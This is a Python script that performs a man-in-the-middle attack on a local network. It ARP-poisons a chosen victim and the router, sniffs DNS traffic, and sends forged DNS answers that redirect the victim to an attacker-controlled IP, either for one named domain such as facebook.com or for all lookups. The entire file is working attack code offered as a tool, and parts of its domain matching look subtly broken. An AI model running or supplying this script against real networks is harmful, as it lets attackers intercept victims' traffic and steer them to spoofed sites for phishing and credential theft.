import os
import sys
import time
import signal
import threading
import argparse
import ctypes
from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="Choose the domain to spoof. Example: -d facebook.com")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP. Example: -r 192.168.0.1")
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP. Example: -v 192.168.0.5")
    parser.add_argument("-t", "--redirectto", help="Optional argument to choose the IP to which the victim will be redirected otherwise defaults to attacker's local IP. Requires either the -d or -a argument. Example: -t 80.87.128.67")
    parser.add_argument("-a", "--spoofall", help="Spoof all DNS requests back to the attacker or use -r to specify an IP to redirect them to", action="store_true")
    return parser.parse_args()

def originalMAC(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r[Ether].src
    return None

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
    sys.exit(0)

def spoofed_pkt(pkt, rIP):
    if pkt.haslayer(DNSQR):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
        send(spoofed_pkt)
        print(f'[+] Sent spoofed packet for {pkt[DNSQR].qname[:-1]}')

def packet_callback(pkt):
    localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
    if pkt.haslayer(DNSQR):
        if arg_parser().spoofall:
            spoofed_pkt(pkt, localIP if not arg_parser().redirectto else arg_parser().redirectto)
        elif arg_parser().domain and arg_parser().domain in pkt[DNS].qd.qname:
            spoofed_pkt(pkt, localIP if not arg_parser().redirectto else arg_parser().redirectto)

def sniff_packets():
    print('[*] Sniffing for DNS requests...')
    sniff(prn=packet_callback, filter="udp port 53", store=0)

def main(args):
    global victimMAC, routerMAC

    if not is_admin():
        sys.exit("[!] Please run as Administrator")

    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)

    if routerMAC is None:
        sys.exit("Could not find router MAC address. Closing....")
    if victimMAC is None:
        sys.exit("Could not find victim MAC address. Closing....")
    
    print(f'[*] Router MAC: {routerMAC}')
    print(f'[*] Victim MAC: {victimMAC}')

    def signal_handler(signal, frame):
        print('Cleaning up...')
        restore(args.routerIP, args.victimIP, routerMAC, victimMAC)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    # Start ARP poisoning in the background
    def arp_poison():
        while True:
            poison(args.routerIP, args.victimIP, routerMAC, victimMAC)
            time.sleep(1.5)

    arp_thread = threading.Thread(target=arp_poison)
    arp_thread.daemon = True
    arp_thread.start()

    # Start sniffing packets
    sniff_packets()

if __name__ == "__main__":
    main(arg_parser())
